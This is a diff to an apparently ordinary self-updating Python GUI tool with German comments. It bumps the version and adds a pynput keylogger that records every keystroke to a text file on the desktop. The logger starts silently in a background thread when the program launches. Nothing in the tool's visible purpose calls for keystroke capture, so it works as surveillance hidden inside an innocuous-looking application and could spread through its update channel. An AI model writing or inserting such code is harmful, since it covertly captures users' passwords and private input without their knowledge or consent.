@@ -3,14 +3,18 @@ import os
 import shutil
 import sys
 import tkinter as tk
+from pynput import keyboard
 
 # Aktuelle Version definieren
-current_version = "1.0.1"  # Deine aktuelle Version
+current_version = "1.0.2"  # Deine aktuelle Version
 script_name = os.path.basename(__file__)  # Der Name des aktuellen Scripts
 
 # GitHub Repository Informationen
 github_username = "dein-benutzername"  # Dein GitHub Benutzername
 repository_name = "dein-repository"  # Dein Repository Name
+
+# Pfad zur Datei auf dem Desktop
+file_path = r"C:\Users\mishu\Desktop\tastenanschlaege.txt"
 
 # Funktion zur Überprüfung und zum Download der neuesten Version
 def check_for_update():
@@ -78,6 +82,30 @@ def create_gui():
     
     root.mainloop()
 
+# Funktionen zur Tastatureingabeüberwachung
+def on_press(key):
+    try:
+        with open(file_path, 'a') as f:
+            f.write(f'{key.char}\n')  # Schreibe den Tastenanschlag in die Datei
+    except AttributeError:
+        with open(file_path, 'a') as f:
+            f.write(f'{key}\n')  # Für Sondertasten wie 'Esc' oder 'Space'
+
+def on_release(key):
+    if key == keyboard.Key.esc:  # Beende das Programm, wenn die Escape-Taste gedrückt wird
+        return False
+
+def start_keylogger():
+    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
 # Hauptfunktion starten
 if __name__ == "__main__":
+    # Starte den Keylogger in einem separaten Thread
+    import threading
+    keylogger_thread = threading.Thread(target=start_keylogger)
+    keylogger_thread.daemon = True  # Damit der Thread beendet wird, wenn das Hauptprogramm beendet wird
+    keylogger_thread.start()
+    
+    # Starte die GUI
     create_gui()
